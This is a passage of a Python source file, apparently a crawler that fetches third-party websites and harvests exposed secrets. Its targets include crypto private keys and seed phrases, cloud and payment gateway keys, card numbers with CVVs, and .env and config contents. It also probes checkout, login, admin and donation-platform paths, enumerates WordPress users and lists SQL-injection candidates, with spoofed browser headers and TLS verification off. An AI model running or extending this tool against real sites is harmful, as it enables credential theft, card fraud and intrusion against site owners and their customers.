         re.compile(r'https://eth-[a-z]+\.g\.alchemy\.com/v2/[A-Za-z0-9_-]{32}', re.I), 0.90),
        ("QuickNode Endpoint", "crypto", "quicknode_endpoint",
         re.compile(r'https://[a-z0-9-]+\.quiknode\.pro/[a-f0-9]{40}', re.I), 0.90),
        ("Moralis API Key", "crypto", "moralis_key",
         re.compile(r'(?:moralis[._-]?)?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{64})["\']?', re.I), 0.85),
        ("Ankr API Key", "crypto", "ankr_key",
         re.compile(r'(?:ankr[._-]?)?(?:api[._-]?)?key["\s:=]+["\']?([a-f0-9]{64})["\']?', re.I), 0.85),
        
        # ------------ Block Explorers ------------
        ("Etherscan API Key", "crypto", "etherscan_key",
         re.compile(r'etherscan[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{34})["\']?', re.I), 0.85),
        ("BscScan API Key", "crypto", "bscscan_key",
         re.compile(r'(?:bscscan[._-]?)?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{34})["\']?', re.I), 0.85),
        ("PolygonScan API Key", "crypto", "polygonscan_key",
         re.compile(r'(?:polygonscan[._-]?)?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{34})["\']?', re.I), 0.85),
        ("BlockCypher Token", "crypto", "blockcypher_token",
         re.compile(r'(?:blockcypher[._-]?)?(?:api[._-]?)?token["\s:=]+["\']?([a-f0-9]{32})["\']?', re.I), 0.85),
        
        # ------------ Crypto Private Keys (CRITICAL!) ------------
        # Ethereum: Require 0x prefix OR key context (bare hex64 matches everything)
        ("Ethereum Private Key", "crypto", "eth_private_key",
         re.compile(r'(?:private[._-]?key|priv[._-]?key|eth[._-]?key|secret[._-]?key|wallet[._-]?key)["\s:=]+["\']?(?:0x)?([a-fA-F0-9]{64})["\']?', re.I), 0.90),
        ("BIP39 Mnemonic", "crypto", "mnemonic",
         re.compile(r'(?:mnemonic|seed[._-]?phrase)["\s:=]+["\']?([a-z]+(?:\s+[a-z]+){11,23})["\']?', re.I), 0.95),
        # WIF Private Key: Require wallet/key context to avoid matching SHA/base64 hashes
        ("WIF Private Key", "crypto", "wif_key",
         re.compile(r'(?:wif|private[._-]?key|wallet[._-]?key|secret[._-]?key)["\s:=]+["\']?([5KL][1-9A-HJ-NP-Za-km-z]{50,51})["\']?', re.I), 0.90),
        
        # =====================================================================
        # =============== WEBHOOKS & INTEGRATIONS ===========================
        # =====================================================================
        
        ("Zapier Webhook", "webhook", "zapier_webhook",
         re.compile(r'https://hooks\.zapier\.com/hooks/catch/\d+/[A-Za-z0-9]+', re.I), 0.95),
        ("IFTTT Webhook", "webhook", "ifttt_webhook",
         re.compile(r'https://maker\.ifttt\.com/trigger/[^/]+/with/key/[A-Za-z0-9_-]+', re.I), 0.95),
        ("Make/Integromat Webhook", "webhook", "make_webhook",
         re.compile(r'https://hook\.(?:us|eu)\d?\.make\.com/[A-Za-z0-9]+', re.I), 0.95),
        ("Pipedream Webhook", "webhook", "pipedream_webhook",
         re.compile(r'https://[a-z0-9]+\.m\.pipedream\.net', re.I), 0.90),
        ("n8n Webhook", "webhook", "n8n_webhook", 
         re.compile(r'https://[a-z0-9.-]+/webhook(?:-test)?/[a-f0-9-]{36}', re.I), 0.85),
        ("Custom Webhook URL", "webhook", "generic_webhook",
         re.compile(r'https?://[^\s"\'<>]+/(?:webhooks?|callbacks?|notify)(?:/|\?)[^\s"\'<>]*', re.I), 0.60),
        
        # =====================================================================
        # =============== PRIVATE KEYS & CERTIFICATES ========================
        # =====================================================================
        
        ("RSA Private Key", "credential", "rsa_key",
         re.compile(r'-----BEGIN RSA PRIVATE KEY-----', re.I), 0.99),
        ("EC Private Key", "credential", "ec_key",
         re.compile(r'-----BEGIN EC PRIVATE KEY-----', re.I), 0.99),
        ("Private Key (Generic)", "credential", "private_key",
         re.compile(r'-----BEGIN PRIVATE KEY-----', re.I), 0.99),
        ("PGP Private Key", "credential", "pgp_key",
         re.compile(r'-----BEGIN PGP PRIVATE KEY BLOCK-----', re.I), 0.99),
        ("SSH Private Key", "credential", "ssh_key",
         re.compile(r'-----BEGIN OPENSSH PRIVATE KEY-----', re.I), 0.99),
        ("DSA Private Key", "credential", "dsa_key",
         re.compile(r'-----BEGIN DSA PRIVATE KEY-----', re.I), 0.99),
        ("X.509 Certificate", "credential", "x509_cert",
         re.compile(r'-----BEGIN CERTIFICATE-----', re.I), 0.70),
        ("PKCS#12 Password", "credential", "pkcs12_pass",
         re.compile(r'(?:pkcs12[._-]?|pfx[._-]?)password["\s:=]+["\']?([^\s"\'<>]+)["\']?', re.I), 0.85),
        
        # =====================================================================
        # =============== EXPOSED FILES & CONFIGS ============================
        # =====================================================================
        
        # .env file - only match KNOWN sensitive variables, not JS constants
        ("Exposed .env File", "config", "env_file",
         re.compile(r'(?:^|[\s"\'])(?:DB_(?:PASSWORD|USER|HOST|NAME|DATABASE)|APP_(?:KEY|SECRET|DEBUG)|API_(?:KEY|SECRET|TOKEN)|SECRET_(?:KEY|TOKEN)|AWS_(?:ACCESS|SECRET)|REDIS_(?:PASSWORD|HOST)|MAIL_(?:PASSWORD|USERNAME)|SMTP_(?:PASSWORD|USER)|JWT_(?:SECRET|KEY)|STRIPE_(?:KEY|SECRET)|PAYPAL_(?:SECRET|CLIENT))\s*[=:]\s*["\']?([^\s\n"\'\']{4,200})["\']?', re.M | re.I), 0.85),
        ("Exposed .git/config", "config", "git_config",
         re.compile(r'\[core\][\s\S]*repositoryformatversion', re.I), 0.95),
        ("Exposed wp-config.php", "config", "wp_config",
         re.compile(r"define\s*\(\s*['\"]DB_(?:PASSWORD|USER|NAME|HOST)['\"]", re.I), 0.95),
        ("Laravel .env", "config", "laravel_env",
         re.compile(r'APP_KEY=base64:[A-Za-z0-9+/=]{44}', re.I), 0.95),
        ("Django SECRET_KEY", "credential", "django_secret",
         re.compile(r'SECRET_KEY["\s:=]+["\']([A-Za-z0-9!@#$%^&*()_+-=]{20,100})["\']', re.I), 0.90),
        ("Rails Secret Key Base", "credential", "rails_secret",
         re.compile(r'secret_key_base[:\s]+["\']?([a-f0-9]{64,128})["\']?', re.I), 0.90),
        ("Spring Boot Properties", "config", "spring_config",
         re.compile(r'spring\.datasource\.password=([^\s\n]+)', re.I), 0.90),
        ("Docker Compose Secret", "config", "docker_secret",
         re.compile(r'(?:COMPOSE|DOCKER)[._-](?:SECRET|PASSWORD|KEY)[:\s]+["\']?([^\s\n"\',;]{12,})["\']?', re.I), 0.65),
        ("NPM Token", "config", "npm_token",
         re.compile(r'//registry\.npmjs\.org/:_authToken=([A-Za-z0-9_-]+)', re.I), 0.95),
        ("PyPI Token", "config", "pypi_token",
         re.compile(r'pypi-[A-Za-z0-9_-]{50,}', re.I), 0.95),
        
        # =====================================================================
        # =============== MISC CREDENTIALS ===================================
        # =====================================================================
        
        ("Hardcoded Password", "credential", "password",
         re.compile(r'(?:password|passwd|pwd|pass)["\s:=]+["\']([^\s"\'<>]{6,50})["\']', re.I), 0.65),
        ("Admin Password", "credential", "admin_password",
         re.compile(r'(?:admin[._-]?password|admin[._-]?pass|root[._-]?password)["\s:=]+["\']([^\s"\'<>]{4,50})["\']', re.I), 0.80),
        ("Email + Password Combo", "credential", "email_password",
         re.compile(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z]{2,10})[:|]+([^\s"\'<>]{6,50})', re.I), 0.60),
        ("Basic Auth Header", "credential", "basic_auth",
         re.compile(r'[Bb]asic\s+([A-Za-z0-9+/=]{20,})', re.I), 0.80),
        ("API Key Generic", "credential", "api_key_generic",
         re.compile(r'(?:api[._-]?key|apikey)["\s:=]+["\']?([A-Za-z0-9_-]{20,})["\']?', re.I), 0.65),
        
        # =====================================================================
        # =============== CARD DATA IN HTML ==================================
        # =====================================================================
        
        # Raw card numbers exposed in HTML/JS (BIN-validated, Luhn-checked post-match)
        ("Visa Card Number", "card_data", "visa_pan",
         re.compile(r'(?<![0-9])4[0-9]{15}(?![0-9])', re.I), 0.70),
        ("Mastercard Number", "card_data", "mc_pan",
         re.compile(r'(?<![0-9])(?:5[1-5][0-9]{14}|2(?:2[2-9][0-9]{12}|[3-6][0-9]{13}|7[0-1][0-9]{12}|720[0-9]{12}))(?![0-9])', re.I), 0.70),
        ("Amex Card Number", "card_data", "amex_pan",
         re.compile(r'(?<![0-9])3[47][0-9]{13}(?![0-9])', re.I), 0.70),
        ("Discover Card Number", "card_data", "discover_pan",
         re.compile(r'(?<![0-9])6(?:011|5[0-9]{2})[0-9]{12}(?![0-9])', re.I), 0.70),
        # Card number with dashes/spaces (formatted)
        ("Formatted Card Number", "card_data", "formatted_pan",
         re.compile(r'(?<![0-9])4[0-9]{3}[\s-][0-9]{4}[\s-][0-9]{4}[\s-][0-9]{4}(?![0-9])', re.I), 0.75),
        # CVV exposed near card context
        ("Exposed CVV", "card_data", "cvv_exposed",
         re.compile(r'(?:cvv|cvc|cvv2|cvc2|security[._-]?code)["\s:=]+["\']?(\d{3,4})["\']?', re.I), 0.60),
        # Full card data in JSON/params (PAN + exp + CVV together)
        ("Card Data JSON", "card_data", "card_json",
         re.compile(r'(?:card[._-]?number|cc[._-]?number|pan)["\s:=]+["\']?(\d{13,19})["\']?', re.I), 0.80),
        
        # =====================================================================
        # =============== EXPOSED SENSITIVE FILES ============================
        # =====================================================================
        
        ("Exposed .env File", "config", "env_file_exposed",
         re.compile(r'(?:APP_KEY|DB_PASSWORD|SECRET_KEY|API_KEY)\s*=\s*([^\s\n]{8,})', re.I), 0.90),
        ("Exposed SQL Dump", "config", "sql_dump_exposed",
         re.compile(r'INSERT\s+INTO\s+[`"]?(?:users?|customers?|cards?|payments?|accounts?)[`"]?\s+VALUES', re.I), 0.85),
        ("Server Path Disclosure", "config", "path_disclosure",
         re.compile(r'(?:Warning|Fatal|Error).*?(?:in|on)\s+(/(?:var|home|www|srv|opt)/[^\s<>"\']+\.php)', re.I), 0.70),
        ("phpinfo Exposed", "config", "phpinfo_exposed",
         re.compile(r'<title>phpinfo\(\)</title>', re.I), 0.95),
        ("Git Config Exposed", "config", "git_config",
         re.compile(r'\[remote "origin"\]\s*url\s*=\s*(.+)', re.I), 0.90),
        ("Directory Listing", "config", "dir_listing",
         re.compile(r'<title>Index of /[^<]*</title>', re.I), 0.80),
    ]
    
    # False positive filters (skip matches containing these)
    FALSE_POSITIVE_INDICATORS = [
        "example", "sample", "test", "demo", "placeholder", "your_",
        "xxx", "TODO", "FIXME", "INSERT", "CHANGE_ME", "your-",
        "12345", "abcdef", "000000", "aaaa", "bbbb",
    ]
    
    # Common JS/HTML words that get matched as secrets
    COMMON_WORDS_BLACKLIST = {
        # JS function/method names
        "addeventlistener", "removeeventlistener", "removeeventlisteners",
        "registertriggers", "getfocusablenode", "getfocusablenodes",
        "setfocustofirstn", "setfocustofirstnode", "getattribute",
        "setattribute", "removeattribute", "queryselector",
        "queryselectorall", "getelementbyid", "getelementsbyname",
        "createelement", "appendchild", "removechild", "replacechild",
        "insertbefore", "classlist", "parentelement", "parentnode",
        "childnodes", "firstchild", "lastchild", "nextsibling",
        "previoussibling", "innerhtml", "outerhtml", "innertext",
        "textcontent", "contenteditable", "offsetheight", "offsetwidth",
        "scrollheight", "scrollwidth", "clientheight", "clientwidth",
        "requestanimationframe", "cancelanimationframe",
        # HTML form/attribute names
        "rememberme", "remember_me", "backtoblog", "backtoblock",
        "loginform", "loginfor", "logoutform", "searchform",
        "clipboard", "clipboar", "password", "username",
        "somewhere", "somewher", "function", "callback",
        "undefined", "document", "windowlocation", "location",
        "prototype", "constructor", "instanceof", "typeof",
        # Language names / common strings
        "indonesian", "indonesi", "javascript", "typescript",
        "stylesheet", "anonymous", "important", "container",
        "component", "autoplay", "viewport", "document",
        # Recaptcha / common plugin strings
        "ulp_recaptcha_public_key", "recaptcha", "captcha",
        # Bootstrap/CSS constant names (falsely detected as .env/API keys)
        "selectordataride", "selectordatatoggle", "selectordatatoggleshown",
        "selectordatatoggleactive", "selectornavbar", "selectorvisibleitems",
        "selectorfixedcontent", "selectorstickycontent", "selectordialog",
        "selectortooltipinner", "selectordataspy", "selectornavlistgroup",
        "selectornavlinks", "selectorlistitems", "selectordropdown",
        "selectordropdownmenu", "selectortabpanel", "selectorouter",
        "selectorinner", "selectorinnerelem", "selectortitle",
        "classnamecollapse", "classnamecollapsed", "classnamehorizontal",
        "classnamedropup", "classnamedropstart", "classnamedropdowncenter",
        "classnameopen", "classnamestatic", "classnamehiding",
        "classnamemodal", "classnamedropdownitem", "classnamehide",
        "classnameshowing", "classdropdown",
        "defaultoptions", "rightmousebutton", "propertymargin",
        "placementtop", "placementbottom", "placementright", "placementtopcenter",
        "eventmousedown", "eventclickdismiss", "escapekeyhideprevent",
        "eventresizeescape", "escapekey", "openselector", "eventhideprevented",
        "eventresize", "eventmodalhide", "eventinserted", "eventmouseenter",
        "eventclick", "eventclickdataapi", "eventloaddataapi",
        "eventkey", "eventmouseout", "eventfocusout", "eventhidden", "eventshown",
        "tabnavforward", "triggerfocus", "triggermanual",
        "ariarattributepattern", "dataurlpattern", "disallowedattributes",
        "arrowrightkey", "arrowdownkey", "isnativelysupported",
        "dataapikey",
        # Keyboard-related JS names (falsely detected as Airtable keys)
        "keyboardshortcuts", "keyframesresolved", "keyboarddisplacem",
        "keyboardfocusshor", "keyboardshortcutc", "keyboardevent",
        "keydownevent", "keypressevent", "keyupevent",
        # CSS class name patterns (t-something style names)
        "tcontentcolumntitle", "tcontentcolumncontent", "theadershortintro",
        "tmetadetailssource", "tshortdescription", "tsectiontitle",
        "tcardbody", "tcardtitle", "tcardtext", "tnavlink",
        # Cookie/session names
        "gdlmsgooglesession", "gdlmsgooglevisitor", "googlesessionstorage",
    }
    
    def __init__(self, timeout: int = 10, max_concurrent: int = 20):
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.seen_values: Set[str] = set()  # Dedup

    @staticmethod
    def _luhn_check(number: str) -> bool:
        """Validate a card number using the Luhn algorithm."""
        digits = [int(d) for d in number if d.isdigit()]
        if len(digits) < 13 or len(digits) > 19:
            return False
        checksum = 0
        for i, d in enumerate(reversed(digits)):
            if i % 2 == 1:
                d *= 2
                if d > 9:
                    d -= 9
            checksum += d
        return checksum % 10 == 0

    @staticmethod
    def _shannon_entropy(s: str) -> float:
        """Calculate Shannon entropy of a string."""
        import math
        if not s:
            return 0.0
        freq = {}
        for c in s:
            freq[c] = freq.get(c, 0) + 1
        length = len(s)
        return -sum((count / length) * math.log2(count / length) for count in freq.values())

    def _detect_high_entropy_secrets(self, text: str, url: str) -> List[ExtractedSecret]:
        """Find high-entropy strings that look like API keys/tokens but don't match any pattern."""
        secrets = []
        entropy_patterns = [
            re.compile(r'["\']([a-zA-Z_]*(?:key|token|secret|password|apikey|api_key|auth|credential|private)[a-zA-Z_]*)["\'][\s]*[:=][\s]*["\']([A-Za-z0-9+/=_\-]{20,80})["\']', re.I),
            re.compile(r'([A-Z_]*(?:KEY|TOKEN|SECRET|PASSWORD|AUTH|CREDENTIAL|PRIVATE)[A-Z_]*)[\s]*=[\s]*["\']?([A-Za-z0-9+/=_\-]{20,80})["\']?', re.I),
        ]
        for pat in entropy_patterns:
            for m in pat.finditer(text):
                key_name = m.group(1)
                value = m.group(2)
                if not value or self._is_false_positive(value):
                    continue
                if value in self.seen_values:
                    continue
                entropy = self._shannon_entropy(value)
                if entropy < 3.5:
                    continue
                if len(set(value)) < 8:
                    continue
                if value.startswith(('http', 'ftp', 'ssh', 'git', 'npm', 'yarn')):
                    continue
                self.seen_values.add(value)
                start = max(0, m.start() - 80)
                end = min(len(text), m.end() + 80)
                context = text[start:end].replace("\n", " ").strip()
                conf = min(0.75, 0.55 + (entropy - 3.5) * 0.13)
                secrets.append(ExtractedSecret(
                    url=url, type="high_entropy_secret", category="credential",
                    key_name=f"Entropy Secret ({key_name})", value=value,
                    context=context, confidence=conf,
                ))
                logger.info(f"Found high-entropy secret: {key_name}={value[:20]}... (entropy={entropy:.2f}) from {url}")
        return secrets

    def _is_false_positive(self, value: str) -> bool:
        """Check if extracted value looks like a false positive."""
        value_lower = value.lower().strip()
        
        # Check against known false positive indicators
        for indicator in self.FALSE_POSITIVE_INDICATORS:
            if indicator in value_lower:
                return True
        
        # Check against common words blacklist
        # Strip non-alphanumeric for comparison
        clean_val = re.sub(r'[^a-z0-9]', '', value_lower)
        if clean_val in self.COMMON_WORDS_BLACKLIST:
            return True
        
        # Too short or all same chars
        if len(value) < 8:
            return True
        if len(set(value)) < 4:
            return True
        
        # Looks like a camelCase JS function/variable name (no separators, mixed case, no digits)
        if re.match(r'^[a-z]+(?:[A-Z][a-z]+){2,}$', value) and '_' not in value and '-' not in value:
            return True
        
        # Pure English word (all lowercase alpha, >= 6 chars, no digits/special)
        if re.match(r'^[a-z]{6,}$', value) and '_' not in value:
            return True
        
        # Contains common JS/HTML fragments
        if any(frag in value_lower for frag in [
            'eventlistener', 'function(', 'return ', 'jquery',
            'recaptcha', '.attr(', '.css(', '.html(',
            'keypress', 'keydown', 'keyup', 'onclick',
            'onload', 'onsubmit', 'onfocus', 'onblur',
            'theme:', 'theme,', 'plugin', '$(this)',
        ]):
            return True
        
        # CSS class-like patterns: t-word, m-word, p-word (common CSS utility prefixes)
        if re.match(r'^[a-z]-[a-zA-Z]{3,}', value):
            return True
        
        return False

    def extract_from_text(self, text: str, url: str = "") -> List[ExtractedSecret]:
        """Extract secrets from text content.
        
        Args:
            text: HTML/text content to scan
            url: Source URL for attribution
            
        Returns:
            List of ExtractedSecret findings
        """
        secrets = []
        
        for name, category, secret_type, pattern, confidence in self.PATTERNS:
            matches = pattern.finditer(text)
            for match in matches:
                # Get the matched value
                value = match.group(1) if match.lastindex and match.lastindex >= 1 else match.group(0)
                
                if not value or self._is_false_positive(value):
                    continue
                
                # Luhn validation for card numbers — skip invalid PANs
                if category == "card_data":
                    digits_only = re.sub(r'[^0-9]', '', value)
                    if digits_only and len(digits_only) >= 13 and not self._luhn_check(digits_only):
                        continue
                
                # Dedup
                if value in self.seen_values:
                    continue
                self.seen_values.add(value)
                
                # Get surrounding context (100 chars before and after)
                start = max(0, match.start() - 100)
                end = min(len(text), match.end() + 100)
                context = text[start:end].replace("\n", " ").strip()
                
                secret = ExtractedSecret(
                    url=url,
                    type=secret_type,
                    category=category,
                    key_name=name,
                    value=value,
                    context=context,
                    confidence=confidence,
                )
                secrets.append(secret)
                logger.info(f"Found {name}: {value[:20]}... from {url}")
        
        # Entropy-based detection for novel secrets not caught by patterns
        entropy_secrets = self._detect_high_entropy_secrets(text, url)
        secrets.extend(entropy_secrets)
        
        return secrets

    async def extract_from_url(self, url: str, 
                                session: aiohttp.ClientSession = None) -> List[ExtractedSecret]:
        """Fetch a URL and extract secrets from its content.
        
        Args:
            url: Target URL to scan
            session: Optional aiohttp session
            
        Returns:
            List of ExtractedSecret findings
        """
        own_session = False
        try:
            if session is None:
                session = aiohttp.ClientSession(
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    headers={
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    }
                )
                own_session = True
            
            async with self.semaphore:
                async with session.get(url, allow_redirects=True, ssl=False) as resp:
                    text = await resp.text(errors="ignore")
                    return self.extract_from_text(text, url)
        
        except asyncio.TimeoutError:
            logger.debug(f"Timeout extracting from {url}")
        except Exception as e:
            logger.debug(f"Error extracting from {url}: {e}")
        finally:
            if own_session and session:
                await session.close()
        
        return []

    async def batch_extract(self, urls: List[str]) -> List[ExtractedSecret]:
        """Extract secrets from multiple URLs concurrently.
        
        Args:
            urls: List of URLs to scan
            
        Returns:
            Combined list of all findings
        """
        all_secrets = []
        
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.timeout),
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            }
        ) as session:
            tasks = [self.extract_from_url(url, session) for url in urls]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, list):
                    all_secrets.extend(result)
        
        return all_secrets

    def get_gateway_secrets(self, secrets: List[ExtractedSecret]) -> List[ExtractedSecret]:
        """Filter secrets to only gateway/payment related."""
        return [s for s in secrets if s.category == "gateway"]

    def get_high_value_secrets(self, secrets: List[ExtractedSecret]) -> List[ExtractedSecret]:
        """Filter to high-value secrets (gateways, cloud, database)."""
        return [s for s in secrets if s.confidence >= 0.80 and 
                s.category in ("gateway", "cloud", "database", "credential")]

    # Payment-related paths to auto-discover
    PAYMENT_PATHS = [
        "/checkout/", "/cart/", "/my-account/", "/shop/",
        "/donate/", "/payment/", "/billing/", "/subscribe/",
        "/membership/", "/order/", "/purchase/", "/pay/",
        "/?add-to-cart=1",  # WooCommerce trigger
    ]
    
    # Extra endpoint paths for discovery (login, admin, config, etc.)
    ENDPOINT_PATHS = [
        "/wp-login.php", "/wp-admin/", "/xmlrpc.php",
        "/wp-json/wp/v2/users", "/wp-json/wp/v2/posts",
        "/wp-json/wp/v2/pages", "/wp-json/wc/v3/products",
        "/?rest_route=/wp/v2/users",  # Non-pretty permalink fallback
        "/?s=test",  # Search
        "/feed/", "/sitemap.xml", "/robots.txt",
        "/admin/", "/administrator/", "/login/",
        "/api/", "/graphql",
        # Political donation platforms
        "/actblue/", "/anedot/", "/winred/",
    ]

    async def deep_extract_site(self, url: str,
                                 session: aiohttp.ClientSession = None) -> dict:
        """Deep extract: scan the given URL + auto-discover payment pages on the same domain.
        
        Returns dict with:
          - secrets: List[ExtractedSecret]
          - platform: dict from detect_platform()
          - endpoints: dict from discover_endpoints()
          - sqli_candidates: list from get_sqli_candidates()
          - pages_scanned: int
        """
        own_session = False
        if session is None:
            session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                }
            )
            own_session = True
        
        all_secrets = []
        parsed = __import__('urllib.parse', fromlist=['urlparse']).urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        platform_info = None
        endpoints_info = {}
        sqli_candidates = []
        pages_scanned = 0
        
        try:
            # 1. Scan the original URL and gather platform/endpoint info
            secrets = await self.extract_from_url(url, session)
            all_secrets.extend(secrets)
            pages_scanned += 1
            
            try:
                async with session.get(url, ssl=False, allow_redirects=True) as resp:
                    main_html = await resp.text(errors='ignore')
                    platform_info = self.detect_platform(main_html)
                    endpoints_info = self.discover_endpoints(main_html, base)
                    sqli_candidates = self.get_sqli_candidates(endpoints_info, base)
            except Exception:
                pass
            
            # 2. Scan payment-related paths
            for path in self.PAYMENT_PATHS:
                payment_url = base + path
                if payment_url == url:
                    continue
                try:
                    page_secrets = await self.extract_from_url(payment_url, session)
                    all_secrets.extend(page_secrets)
                    pages_scanned += 1
                    
                    # Also gather platform info from payment pages (may have more gateways loaded)
                    if platform_info:
                        async with session.get(payment_url, ssl=False, allow_redirects=True) as resp:
                            if resp.status == 200:
                                pay_html = await resp.text(errors='ignore')
                                pay_info = self.detect_platform(pay_html)
                                for gw in pay_info.get('gateways', []):
                                    if gw not in platform_info['gateways']:
                                        platform_info['gateways'].append(gw)
                                # Merge endpoint discoveries  
                                pay_endpoints = self.discover_endpoints(pay_html, base)
                                for key in pay_endpoints:
                                    for ep in pay_endpoints[key]:
                                        if ep not in endpoints_info.get(key, []):
                                            endpoints_info.setdefault(key, []).append(ep)
                except Exception:
                    pass
            
            # 3. Scan endpoint discovery paths (login, API, etc.)
            for path in self.ENDPOINT_PATHS:
                ep_url = base + path
                try:
                    async with session.get(ep_url, ssl=False, allow_redirects=False) as resp:
                        if resp.status in (200, 301, 302, 403):
                            # Page exists — interesting
                            if resp.status == 200:
                                ep_html = await resp.text(errors='ignore')
                                ep_secrets = self.extract_from_text(ep_html, ep_url)
                                all_secrets.extend(ep_secrets)
                                pages_scanned += 1
                                
                                # wp-json/wp/v2/users can expose usernames
                                if '/wp/v2/users' in path and '"slug"' in ep_html:
                                    all_secrets.append(ExtractedSecret(
                                        url=ep_url,
                                        type="wp_users_exposed",
                                        category="config",
                                        key_name="WP Users API (Exposed)",
                                        value=ep_url,
                                        confidence=0.90,
                                    ))
                            elif resp.status == 403:
                                # Exists but forbidden — still interesting
                                pass
                except Exception:
                    pass
            
            # 4. Discover JS files with gateway references from original page
            try:
                if main_html:
                    scripts = re.findall(
                        r'src=["\']([^"\']*/(?:checkout|payment|stripe|braintree|paypal|square|gateway)[^"\']*)["\'\s>]',
                        main_html, re.I
                    )
                    for script_url in scripts[:10]:
                        if script_url.startswith('//'):
                            script_url = parsed.scheme + ':' + script_url
                        elif script_url.startswith('/'):
                            script_url = base + script_url
                        try:
                            js_secrets = await self.extract_from_url(script_url, session)
                            all_secrets.extend(js_secrets)
                        except Exception:
                            pass
            except Exception:
                pass
            
            # Refresh sqli candidates with all discovered endpoints
            sqli_candidates = self.get_sqli_candidates(endpoints_info, base)
        
        finally:
            if own_session:
                await session.close()
        
        return {
            "secrets": all_secrets,
            "platform": platform_info,
            "endpoints": endpoints_info,
            "sqli_candidates": sqli_candidates,
            "pages_scanned": pages_scanned,
        }
        
        return all_secrets

    def detect_platform(self, html: str) -> dict:
        """Detect CMS, gateway, form type from HTML source.
        
        Uses SDK-specific signatures to avoid false positives:
        - Braintree: only matches js.braintreegateway.com, braintree-web SDK, braintree client tokens
        - Square: only matches squareup.com SDK, sq0 tokens, square-payment-form
        - PayPal: only matches paypal.com/sdk, paypalobjects.com, PayPal client IDs
        - Stripe: only matches js.stripe.com, Stripe() calls, pk_live/pk_test tokens
        """
        info = {
            "platform": None,
            "gateways": [],
            "form_type": None,
            "has_ajax": False,
            "has_nonce": False,
            "has_captcha": False,
            "has_waf": False,
            "endpoints": [],
            "sqli_candidates": [],
        }
        
        html_lower = html.lower()
        
        # Platform — use definitive markers, not just keywords
        if 'wp-content/' in html_lower or 'wp-includes/' in html_lower:
            info['platform'] = 'WordPress'
        elif 'shopify.com' in html_lower or 'cdn.shopify.com' in html_lower:
            info['platform'] = 'Shopify'
        elif 'mage/' in html_lower or '/static/frontend/' in html_lower or 'magento' in html_lower:
            info['platform'] = 'Magento'
        elif 'drupal.js' in html_lower or 'drupal.settings' in html_lower:
            info['platform'] = 'Drupal'
        elif 'joomla' in html_lower and ('/media/system/' in html_lower or '/administrator/' in html_lower):
            info['platform'] = 'Joomla'
        elif 'prestashop' in html_lower:
            info['platform'] = 'PrestaShop'
        
        # Gateways — SDK-specific signatures ONLY (no keyword matching)
        # Stripe: js.stripe.com, Stripe() constructor, pk_ tokens
        stripe_sigs = [
            'js.stripe.com', 'stripe.js', 'stripe(', 'stripe.elements',
            'pk_live_', 'pk_test_', 'stripe.createtoken', 'stripe.confirmcard',
            'stripe.confirmpayment', 'stripepublishablekey', 'stripe_publishable',
            'wc-stripe', 'wc_stripe', 'stripe-payment',
        ]
        if any(sig in html_lower for sig in stripe_sigs):
            if 'wc_stripe_upe' in html_lower:
                info['gateways'].append('Stripe (UPE/embedded)')
            else:
                info['gateways'].append('Stripe')
        
        # Braintree: js.braintreegateway.com, braintree-web SDK, client tokens
        braintree_sigs = [
            'js.braintreegateway.com', 'braintree-web/', 'braintree.client.',
            'braintree.dropin.', 'braintree.hostedfields.', 'braintree.paypal.',
            'braintree-client', 'braintree-hosted-fields', 'braintree-dropin',
            'production_', 'sandbox_',  # tokenization key prefixes
            'wc-braintree', 'wc_braintree', 'client_token_nonce',
        ]
        # Extra validation: "production_" and "sandbox_" must have the right format
        braintree_token_match = bool(re.search(
            r'(?:production|sandbox)_[a-z0-9]{8}_[a-z0-9]{16,32}', html, re.I
        ))
        braintree_sdk = any(sig in html_lower for sig in braintree_sigs[:11])
        if braintree_sdk or braintree_token_match:
            info['gateways'].append('Braintree')
        
        # PayPal: paypal.com/sdk, paypalobjects.com, PayPal client IDs
        paypal_sigs = [
            'paypal.com/sdk', 'paypalobjects.com', 'paypal.buttons(',
            'paypal.checkout.', 'data-paypal-button', 'paypal-button',
            'paypal-sdk', 'paypal.payments.', 'paypal_client_id',
            'wc-paypal', 'ppcp-',
        ]
        if any(sig in html_lower for sig in paypal_sigs):
            info['gateways'].append('PayPal')
        
        # Square: squareup.com SDK, sq0 tokens, square payment form
        square_sigs = [
            'squareup.com', 'square.js', 'sq0atp-', 'sq0csp-', 'sq0idp-',
            'squarepaymentform', 'square-payment-form', 'square.payments(',
            'web.squarecdn.com', 'sandbox.squareup',
        ]
        if any(sig in html_lower for sig in square_sigs):
            info['gateways'].append('Square')
        
        # Adyen: adyen.com checkout SDK, adyen client key
        adyen_sigs = [
            'checkoutshopper-live.adyen.com', 'checkoutshopper-test.adyen.com',
            'adyen.checkout', 'adyencheckout', 'adyen-checkout',
            'test_', 'live_',  # but only if near "adyen"
        ]
        if any(sig in html_lower for sig in adyen_sigs[:5]):
            info['gateways'].append('Adyen')
        elif re.search(r'adyen[\s\S]{0,100}(?:test_|live_)[A-Za-z0-9]{20,}', html, re.I):
            info['gateways'].append('Adyen')
        
        # Checkout.com: checkout.com SDK, frames
        checkoutcom_sigs = [
            'cdn.checkout.com', 'frames.checkout.com', 'checkout.frames',
            'cko-', 'checkout-sdk',
        ]
        if any(sig in html_lower for sig in checkoutcom_sigs):
            info['gateways'].append('Checkout.com')
        
        # Authorize.net
